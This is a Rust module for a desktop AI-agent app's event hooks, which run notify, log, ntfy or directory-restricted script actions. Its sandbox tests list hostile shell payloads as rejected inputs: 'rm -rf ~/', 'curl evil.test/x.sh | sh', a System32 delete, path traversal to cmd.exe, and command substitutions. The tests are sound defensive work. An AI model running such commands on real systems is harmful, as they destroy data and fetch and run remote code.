//! User-state hooks: event → action rules that
//! fire on agent runtime events. A hook matches an event kind (e.g.
//! `tool_completed`, `turn_completed`, `error`) and an optional text matcher,
//! then runs one of three actions: a desktop **notify**, a shell **command**, or
//! a plain **log** entry. Evaluation runs inside the existing runtime-event
//! consumer loop (`lib.rs`).
//!
//! Lock discipline (CLAUDE.md 坑点 2): the engine loads matching hooks into a
//! `Vec` and drops the DB connection BEFORE running any action or spawning a
//! process — no `MutexGuard` is ever held across a spawn/await.

use crate::proc::NoWindow;
use std::process::Command;
use std::sync::Arc;

use rusqlite::params;
use serde::{Deserialize, Serialize};
use tauri::{AppHandle, Emitter, State};

use crate::db::DbManager;
use crate::runtime::RuntimeEventKind;
use crate::runtime_manager::SessionEventEnvelope;
use super::safety::push_ntfy;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Hook {
    pub id: String,
    pub name: String,
    /// Event kind to match: a runtime kind string, or `*` for any hookable event.
    pub event: String,
    /// Optional case-insensitive substring required in the event text.
    pub matcher: String,
    /// `notify` | `command` | `log`.
    pub action_type: String,
    /// Notify → body; command → shell command line; log → message.
    pub action_payload: String,
    pub enabled: bool,
    pub created_at: String,
    pub fire_count: i64,
    pub last_fired_at: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HookRun {
    pub id: i64,
    pub hook_id: String,
    pub hook_name: String,
    pub session_id: String,
    pub event: String,
    pub fired_at: String,
    pub ok: bool,
    pub detail: String,
}

/// Event kinds a hook may fire on. Noisy streaming kinds (assistant_delta,
/// raw_log, user/assistant messages, plan) are intentionally excluded.
pub const HOOKABLE_KINDS: &[&str] = &[
    "session_started",
    "tool_started",
    "tool_completed",
    "approval_requested",
    "turn_completed",
    "error",
];

fn kind_str(kind: RuntimeEventKind) -> &'static str {
    match kind {
        RuntimeEventKind::SessionStarted => "session_started",
        RuntimeEventKind::UserMessage => "user_message",
        RuntimeEventKind::AssistantDelta => "assistant_delta",
        RuntimeEventKind::AssistantMessage => "assistant_message",
        RuntimeEventKind::Plan => "plan",
        RuntimeEventKind::ToolStarted => "tool_started",
        RuntimeEventKind::ToolCompleted => "tool_completed",
        RuntimeEventKind::ApprovalRequested => "approval_requested",
        RuntimeEventKind::TurnCompleted => "turn_completed",
        RuntimeEventKind::Error => "error",
        RuntimeEventKind::RawLog => "raw_log",
    }
}


/// Run a single hook's action. Pure side-effects; returns `(ok, detail)`.
/// `app` is optional so this is reusable from a manual test command.
async fn run_action(
    app: Option<&AppHandle>,
    hook_name: &str,
    action_type: &str,
    payload: &str,
    session_id: &str,
    event: &str,
    text: &str,
) -> (bool, String) {
    match action_type {
        "notify" => {
            let body = if payload.is_empty() { format!("{event}: {text}") } else { payload.to_string() };
            if let Some(app) = app {
                let _ = app.emit(
                    "omnix-notification",
                    serde_json::json!({ "title": format!("Hook · {hook_name}"), "body": body }),
                );
            }
            (true, "已发送通知".into())
        }
        "command" => {
            if payload.trim().is_empty() {
                return (false, "命令为空".into());
            }
            let (script, args) = match resolve_hook_script(payload) {
                Ok(resolved) => resolved,
                Err(why) => return (false, why),
            };
            // Fire-and-forget so a slow command never stalls the event loop.
            //
            // 以前这里是 `cmd /C <payload>` / `sh -c <payload>`——payload 是数据库里
            // 一个任意字符串，等于「谁能改 hook 规则，谁就能在这台机器上执行任意
            // 命令」。现在走的是**已解析的绝对路径 + 分开传的参数**，全程不经
            // shell：payload 里的 `;`、`&&`、反引号都只是普通字符。
            #[cfg(windows)]
            let mut command = {
                let is_batch = script
                    .extension()
                    .and_then(|e| e.to_str())
                    .is_some_and(|e| e.eq_ignore_ascii_case("bat") || e.eq_ignore_ascii_case("cmd"));
                if is_batch {
                    // Windows 上 .bat/.cmd 只能由 cmd 解释。传的是我们校验过的绝对
                    // 路径，不是用户字符串，所以没有拼接注入面。
                    let mut c = Command::new("cmd");
                    c.arg("/C").arg(&script).args(&args);
                    c
                } else {
                    let mut c = Command::new(&script);
                    c.args(&args);
                    c
                }
            };
            #[cfg(not(windows))]
            let mut command = {
                let mut c = Command::new(&script);
                c.args(&args);
                c
            };
            command
                .no_window()
                .env("OMNIX_HOOK_NAME", hook_name)
                .env("OMNIX_SESSION_ID", session_id)
                .env("OMNIX_EVENT", event)
                .env("OMNIX_EVENT_TEXT", text);
            match command.spawn() {
                Ok(child) => (true, format!("已执行命令 (pid {})", child.id())),
                Err(error) => (false, format!("命令执行失败: {error}")),
            }
        }
        "log" => {
            let msg = if payload.is_empty() { format!("{event}: {text}") } else { payload.to_string() };
            (true, msg)
        }
        // 推到手机。**这是 OMNIX 里唯一能把消息送出这台机器的路径**——上面那个
        // `notify` 只是 emit 一个前端事件，人不在电脑前时等于没有通知。
        //
        // payload 格式：`<server>|<topic>`，例如 `https://ntfy.sh|omnix-alerts`。
        // 不做成结构化字段是因为 hooks 表只有一个 action_payload 列，为一种动作加
        // 两列会让其余动作全带着两个空列。
        "ntfy" => {
            let mut parts = payload.splitn(2, '|');
            let server = parts.next().unwrap_or("").trim();
            let topic = parts.next().unwrap_or("").trim();
            if server.is_empty() || topic.is_empty() {
                return (
                    false,
                    "ntfy 动作需要 `<服务器>|<主题>` 形式的载荷，例如 https://ntfy.sh|my-topic".into(),
                );
            }
            let title = format!("OMNIX · {hook_name}");
            let body = if text.is_empty() { event.to_string() } else { text.to_string() };
            // **等结果再报**，不 fire-and-forget：钩子运行记录里那句「成功」是用户
            // 判断「消息到底发出去没有」的唯一依据，抢答等于把失败藏起来。
            match push_ntfy(server, topic, &title, &body).await {
                Ok(()) => (true, format!("已推送到 {server}/{topic}")),
                Err(error) => (false, format!("推送失败：{error}")),
            }
        }
        other => (false, format!("未知动作类型: {other}")),
    }
}

/// 存放可被 hook 调用的脚本。**只有这个目录里的东西能跑。**
pub fn hook_scripts_dir() -> std::path::PathBuf {
    crate::storage::omnix_root().join("hooks")
}

/// 把 hook 的 command 解析成「一个已注册脚本 + 若干参数」。
///
/// 这是 hook 动作的**唯一**执行入口，也是这条路上唯一的闸。规则：
/// - 第一段是脚本名，必须落在 `~/.omnix/hooks/` 下且真实存在；
/// - 名字里不许有路径分隔符，规范化之后还要再确认没跳出那个目录（`..`、符号链接）；
/// - 其余段作为参数**分开传**，不拼进任何命令行字符串。
///
/// 于是「任意 shell 字符串」这个能力整个消失了：想让 hook 干什么，先把脚本放进
/// 那个目录——那一步是用户在文件管理器里做的，不是某条数据库记录能替他做的。
fn resolve_hook_script(payload: &str) -> Result<(std::path::PathBuf, Vec<String>), String> {
    let parts = split_args(payload);
    let Some((name, args)) = parts.split_first() else {
        return Err("命令为空".into());
    };
    if name.contains('/') || name.contains('\\') {
        return Err(format!(
            "脚本名不能带路径：直接写文件名，脚本要放在 {} 下",
            hook_scripts_dir().display()
        ));
    }
    let dir = hook_scripts_dir();
    let candidate = dir.join(name);
    if !candidate.is_file() {
        return Err(format!(
            "找不到脚本「{name}」。hook 现在只能执行 {} 里的脚本——把它放进去再试。",
            dir.display()
        ));
    }
    // 规范化后再比一次：挡住符号链接指向目录外的情况。
    let real = candidate.canonicalize().map_err(|e| format!("脚本无法访问：{e}"))?;
    let real_dir = dir.canonicalize().map_err(|e| format!("脚本目录无法访问：{e}"))?;
    if !real.starts_with(&real_dir) {
        return Err(format!("「{name}」指向了 {} 之外，拒绝执行", dir.display()));
    }
    Ok((real, args.to_vec()))
}

/// 按空白切分，支持用双引号包住带空格的参数。
///
/// 刻意**不**处理反引号、`$()`、管道这些——它们在这里本来就没有意义（不过 shell），
/// 原样当普通字符传给脚本即可。
fn split_args(input: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut current = String::new();
    let mut quoted = false;
    for ch in input.trim().chars() {
        match ch {
            '"' => quoted = !quoted,
            c if c.is_whitespace() && !quoted => {
                if !current.is_empty() {
                    out.push(std::mem::take(&mut current));
                }
            }
            c => current.push(c),
        }
    }
    if !current.is_empty() {
        out.push(current);
    }
    out
}

fn record_run(db: &DbManager, hook: &Hook, session_id: &str, event: &str, ok: bool, detail: &str) {
    let Ok(conn) = db.get_connection() else { return };
    let _ = conn.execute(
        "INSERT INTO hook_runs (hook_id, hook_name, session_id, event, ok, detail)
         VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
        params![hook.id, hook.name, session_id, event, ok as i32, detail],
    );
    let _ = conn.execute(
        "UPDATE hooks SET fire_count = fire_count + 1, last_fired_at = datetime('now') WHERE id = ?1",
        params![hook.id],
    );
    // Keep the run log bounded.
    let _ = conn.execute(
        "DELETE FROM hook_runs WHERE id NOT IN (SELECT id FROM hook_runs ORDER BY id DESC LIMIT 500)",
        [],
    );
}

/// Evaluate enabled hooks against one runtime event. Called from the runtime
/// event consumer loop. Cheap for the common case (filters noisy kinds first,
/// then a single indexed-ish query); never holds a DB guard across the action.
pub async fn evaluate_hooks(db: &DbManager, app: &AppHandle, envelope: &SessionEventEnvelope) {
    let event = kind_str(envelope.event.kind);
    if !HOOKABLE_KINDS.contains(&event) {
        return;
    }
    let text = envelope.event.text.clone().unwrap_or_default();

    // Load matching enabled hooks into a Vec, then drop the connection.
    let matched: Vec<Hook> = {
        let Ok(conn) = db.get_connection() else { return };
        let Ok(mut stmt) = conn.prepare(
            "SELECT id, name, event, matcher, action_type, action_payload, enabled, created_at, fire_count, last_fired_at
             FROM hooks WHERE enabled = 1 AND (event = ?1 OR event = '*')",
        ) else { return };
        let rows = stmt.query_map(params![event], |row| {
            Ok(Hook {
                id: row.get(0)?,
                name: row.get(1)?,
                event: row.get(2)?,
                matcher: row.get(3)?,
                action_type: row.get(4)?,
                action_payload: row.get(5)?,
                enabled: row.get::<_, i32>(6)? != 0,
                created_at: row.get(7)?,
                fire_count: row.get(8)?,
                last_fired_at: row.get(9)?,
            })
        });
        match rows {
            Ok(rows) => rows
                .flatten()
                .filter(|h| h.matcher.trim().is_empty() || text.to_lowercase().contains(&h.matcher.to_lowercase()))
                .collect(),
            Err(_) => return,
        }
    };

    for hook in matched {
        let (ok, detail) = run_action(
            Some(app),
            &hook.name,
            &hook.action_type,
            &hook.action_payload,
            &envelope.session_id,
            event,
            &text,
        ).await;
        record_run(db, &hook, &envelope.session_id, event, ok, &detail);
    }
}

// ── Tauri commands ─────────────────────────────────────────────────────────

#[tauri::command]
pub fn list_hooks(db: State<'_, Arc<DbManager>>) -> Result<Vec<Hook>, String> {
    let conn = db.get_connection().map_err(|e| e.to_string())?;
    let mut stmt = conn
        .prepare(
            "SELECT id, name, event, matcher, action_type, action_payload, enabled, created_at, fire_count, last_fired_at
             FROM hooks ORDER BY created_at DESC",
        )
        .map_err(|e| e.to_string())?;
    let rows = stmt
        .query_map([], |row| {
            Ok(Hook {
                id: row.get(0)?,
                name: row.get(1)?,
                event: row.get(2)?,
                matcher: row.get(3)?,
                action_type: row.get(4)?,
                action_payload: row.get(5)?,
                enabled: row.get::<_, i32>(6)? != 0,
                created_at: row.get(7)?,
                fire_count: row.get(8)?,
                last_fired_at: row.get(9)?,
            })
        })
        .map_err(|e| e.to_string())?;
    rows.collect::<Result<Vec<_>, _>>().map_err(|e| e.to_string())
}

#[allow(clippy::too_many_arguments)]
#[tauri::command]
pub fn save_hook(
    id: Option<String>,
    name: String,
    event: String,
    matcher: String,
    action_type: String,
    action_payload: String,
    enabled: bool,
    db: State<'_, Arc<DbManager>>,
) -> Result<Hook, String> {
    if name.trim().is_empty() {
        return Err("请填写 Hook 名称".into());
    }
    if !matches!(action_type.as_str(), "notify" | "command" | "log") {
        return Err("动作类型必须是 notify / command / log".into());
    }
    let conn = db.get_connection().map_err(|e| e.to_string())?;
    let id = id.unwrap_or_else(|| format!("hook_{}", chrono::Utc::now().timestamp_micros()));
    conn.execute(
        "INSERT INTO hooks (id, name, event, matcher, action_type, action_payload, enabled)
         VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)
         ON CONFLICT(id) DO UPDATE SET
            name = excluded.name, event = excluded.event, matcher = excluded.matcher,
            action_type = excluded.action_type, action_payload = excluded.action_payload,
            enabled = excluded.enabled",
        params![id, name.trim(), event, matcher, action_type, action_payload, enabled as i32],
    )
    .map_err(|e| e.to_string())?;
    conn.query_row(
        "SELECT id, name, event, matcher, action_type, action_payload, enabled, created_at, fire_count, last_fired_at FROM hooks WHERE id = ?1",
        params![id],
        |row| {
            Ok(Hook {
                id: row.get(0)?,
                name: row.get(1)?,
                event: row.get(2)?,
                matcher: row.get(3)?,
                action_type: row.get(4)?,
                action_payload: row.get(5)?,
                enabled: row.get::<_, i32>(6)? != 0,
                created_at: row.get(7)?,
                fire_count: row.get(8)?,
                last_fired_at: row.get(9)?,
            })
        },
    )
    .map_err(|e| e.to_string())
}

#[tauri::command]
pub fn toggle_hook(id: String, enabled: bool, db: State<'_, Arc<DbManager>>) -> Result<(), String> {
    let conn = db.get_connection().map_err(|e| e.to_string())?;
    conn.execute("UPDATE hooks SET enabled = ?2 WHERE id = ?1", params![id, enabled as i32])
        .map_err(|e| e.to_string())?;
    Ok(())
}

#[tauri::command]
pub fn delete_hook(id: String, db: State<'_, Arc<DbManager>>) -> Result<(), String> {
    let conn = db.get_connection().map_err(|e| e.to_string())?;
    conn.execute("DELETE FROM hooks WHERE id = ?1", params![id]).map_err(|e| e.to_string())?;
    Ok(())
}

/// Manually fire a hook's action once (for the UI "测试" button).
#[tauri::command]
pub async fn test_hook(id: String, app: AppHandle, db: State<'_, Arc<DbManager>>) -> Result<String, String> {
    let hook = {
        let conn = db.get_connection().map_err(|e| e.to_string())?;
        conn.query_row(
            "SELECT id, name, event, matcher, action_type, action_payload, enabled, created_at, fire_count, last_fired_at FROM hooks WHERE id = ?1",
            params![id],
            |row| {
                Ok(Hook {
                    id: row.get(0)?,
                    name: row.get(1)?,
                    event: row.get(2)?,
                    matcher: row.get(3)?,
                    action_type: row.get(4)?,
                    action_payload: row.get(5)?,
                    enabled: row.get::<_, i32>(6)? != 0,
                    created_at: row.get(7)?,
                    fire_count: row.get(8)?,
                    last_fired_at: row.get(9)?,
                })
            },
        )
        .map_err(|e| format!("找不到 Hook: {e}"))?
    };
    let (ok, detail) = run_action(
        Some(&app),
        &hook.name,
        &hook.action_type,
        &hook.action_payload,
        "test-session",
        "test",
        "（手动测试触发）",
    ).await;
    record_run(&db, &hook, "test-session", "test", ok, &detail);
    if ok { Ok(detail) } else { Err(detail) }
}

#[tauri::command]
pub fn get_hook_runs(limit: Option<u32>, db: State<'_, Arc<DbManager>>) -> Result<Vec<HookRun>, String> {
    let limit = limit.unwrap_or(50).min(500);
    let conn = db.get_connection().map_err(|e| e.to_string())?;
    let mut stmt = conn
        .prepare(
            "SELECT id, hook_id, hook_name, session_id, event, fired_at, ok, detail
             FROM hook_runs ORDER BY id DESC LIMIT ?1",
        )
        .map_err(|e| e.to_string())?;
    let rows = stmt
        .query_map(params![limit], |row| {
            Ok(HookRun {
                id: row.get(0)?,
                hook_id: row.get(1)?,
                hook_name: row.get(2)?,
                session_id: row.get(3)?,
                event: row.get(4)?,
                fired_at: row.get(5)?,
                ok: row.get::<_, i32>(6)? != 0,
                detail: row.get(7)?,
            })
        })
        .map_err(|e| e.to_string())?;
    rows.collect::<Result<Vec<_>, _>>().map_err(|e| e.to_string())
}

#[tauri::command]
pub fn clear_hook_runs(db: State<'_, Arc<DbManager>>) -> Result<(), String> {
    let conn = db.get_connection().map_err(|e| e.to_string())?;
    conn.execute("DELETE FROM hook_runs", []).map_err(|e| e.to_string())?;
    Ok(())
}

#[cfg(test)]
mod sandbox_tests {
    use super::*;

    /// 这些 payload 以前会原样交给 `cmd /C` / `sh -c`——每一条都是一次
    /// 本机任意命令执行。现在它们连不上任何进程：不是被 shell 转义了，
    /// 而是**根本没有 shell**，第一段解析不成已注册脚本就直接被拒。
    #[test]
    fn arbitrary_shell_strings_no_longer_reach_a_process() {
        for payload in [
            "rm -rf ~/",
            "curl evil.test/x.sh | sh",
            "echo hi && del /f /q C:\\Windows\\System32",
            "notepad.exe",                 // 系统程序也不行——不在 hooks 目录里
            "../../../Windows/System32/cmd.exe",
            "/bin/sh",
            "C:\\Windows\\System32\\cmd.exe",
            "`whoami`",
            "$(id)",
        ] {
            let result = resolve_hook_script(payload);
            assert!(result.is_err(), "{payload} 不该被解析成可执行的东西：{result:?}");
        }
    }

    /// 带路径分隔符的名字要给出**能照做的**提示，而不是笼统的失败。
    #[test]
    fn path_separators_are_refused_with_an_actionable_message() {
        for payload in ["sub/deploy.sh", "sub\\deploy.bat", "../escape.sh"] {
            let why = resolve_hook_script(payload).unwrap_err();
            assert!(why.contains("hooks"), "提示要说明脚本该放哪：{why}");
        }
    }

    /// 注册过的脚本能跑，参数**分开**传，shell 元字符只是普通字符。
    #[test]
    fn a_registered_script_resolves_with_its_arguments_kept_separate() {
        let dir = hook_scripts_dir();
        if std::fs::create_dir_all(&dir).is_err() {
            return; // 没有可写的 home 就跳过，不是被测逻辑的问题
        }
        // 名字要带时间戳：只用 pid 的话，同一次 `cargo test` 里并行跑的实例会
        // 互相删掉对方的脚本，测试就变成偶尔红一次——比没有测试更糟。
        let name = format!(
            "omnix_test_hook_{}_{}.sh",
            std::process::id(),
            chrono::Utc::now().timestamp_micros()
        );
        let script = dir.join(&name);
        if std::fs::write(&script, "#!/bin/sh\necho ok\n").is_err() {
            return;
        }

        let (resolved, args) =
            resolve_hook_script(&format!("{name} --msg \"a b\" x;y")).expect("已注册的脚本应当能解析");
        assert!(resolved.ends_with(&name), "{resolved:?}");
        // 解析结果必须落在 hooks 目录里。**这条才是真正守着目录闸的断言**——
        // 上面那些「rm -rf」用例只能证明它们不存在或带了路径分隔符，证明不了
        // 「只允许这个目录」这件事本身。
        let real_dir = dir.canonicalize().expect("hooks 目录");
        assert!(
            resolved.starts_with(&real_dir),
            "解析结果跑到 hooks 目录之外了：{resolved:?} 不在 {real_dir:?} 下"
        );
        // `x;y` 原样是一个参数——它没有机会变成第二条命令。
        assert_eq!(args, vec!["--msg".to_string(), "a b".to_string(), "x;y".to_string()]);

        let _ = std::fs::remove_file(&script);
    }

    #[test]
    fn quoted_arguments_survive_splitting() {
        assert_eq!(split_args("a \"b c\" d"), vec!["a", "b c", "d"]);
        assert_eq!(split_args("   "), Vec::<String>::new());
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn matcher_and_log_action() {
        let db_path = std::env::temp_dir().join(format!("omnix_hooks_{}.sqlite", chrono::Utc::now().timestamp_micros()));
        let db = DbManager::new_runtime_test(db_path.clone());
        db.init_schema().expect("schema");

        // A log hook that only matches events whose text contains "deploy".
        let conn = db.get_connection().unwrap();
        conn.execute(
            "INSERT INTO hooks (id, name, event, matcher, action_type, action_payload, enabled) VALUES ('h1','build','turn_completed','deploy','log','done',1)",
            [],
        ).unwrap();
        drop(conn);

        let (ok, _) = run_action(None, "build", "log", "done", "s1", "turn_completed", "running deploy step").await;
        assert!(ok);

        // ntfy 的载荷格式错了要**说清楚怎么写**，不能只报失败。
        // 用户在钩子编辑框里填的是一个自由文本，格式约定只存在于这句提示里。
        for bad in ["", "https://ntfy.sh", "|topic", "https://ntfy.sh|"] {
            let (ok, detail) = run_action(None, "h", "ntfy", bad, "s1", "turn_completed", "t").await;
            assert!(!ok, "载荷 {bad:?} 应被拒");
            assert!(detail.contains("服务器"), "错误里要给出格式示例，实际：{detail}");
        }

        // Unknown action type fails cleanly.
        let (ok2, _) = run_action(None, "x", "bogus", "", "s1", "turn_completed", "").await;
        assert!(!ok2);

        drop(db);
        let _ = std::fs::remove_file(db_path);
    }
}
